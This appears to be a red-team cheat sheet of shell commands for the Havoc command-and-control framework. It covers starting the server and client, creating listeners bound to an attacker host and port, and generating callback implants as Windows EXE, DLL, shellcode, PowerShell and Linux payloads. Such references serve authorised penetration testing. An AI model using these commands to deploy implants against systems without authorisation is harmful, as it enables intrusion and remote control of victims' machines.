# Havoc

## setup

### Start server

Start the Havoc server.

```sh title:"Start Havoc server"
sudo ./havoc server
```
<!-- cheat -->

### Start client

Start the Havoc client.

```sh title:"Start Havoc client"
./havoc client
```
<!-- cheat -->

### Create listener

Create a listener.

```sh title:"Create Havoc listener"
havoc listener --name "$listener_name" --host "$lhost" --port "$lport"
```
<!-- cheat
var listener_name
var lhost
var lport
-->

### List listeners

List available listeners.

```sh title:"List Havoc listeners"
havoc listener --list
```
<!-- cheat -->

## payloads

### Windows EXE

Generate a Windows EXE payload.

```sh title:"Generate Havoc Windows EXE payload"
havoc payload --listener "$listener_name" --format exe --output "$output_file"
```
<!-- cheat
var listener_name
var output_file
-->

### Windows DLL

Generate a Windows DLL payload.

```sh title:"Generate Havoc Windows DLL payload"
havoc payload --listener "$listener_name" --format dll --output "$output_file"
```
<!-- cheat
var listener_name
var output_file
-->

### Shellcode

Generate shellcode.

```sh title:"Generate Havoc shellcode payload"
havoc payload --listener "$listener_name" --format shellcode --output "$output_file"
```
<!-- cheat
var listener_name
var output_file
-->

### PowerShell

Generate a PowerShell payload.

```sh title:"Generate Havoc PowerShell payload"
havoc payload --listener "$listener_name" --format powershell --output "$output_file"
```
<!-- cheat
var listener_name
var output_file
-->

### Linux

Generate a Linux payload.

```sh title:"Generate Havoc Linux payload"
havoc payload --listener "$listener_name" --format linux --output "$output_file"
```
<!-- cheat
var listener_name
var output_file
-->

### Formats

List available payload formats.

```sh title:"List Havoc payload formats"
havoc payload --formats
```
<!-- cheat -->
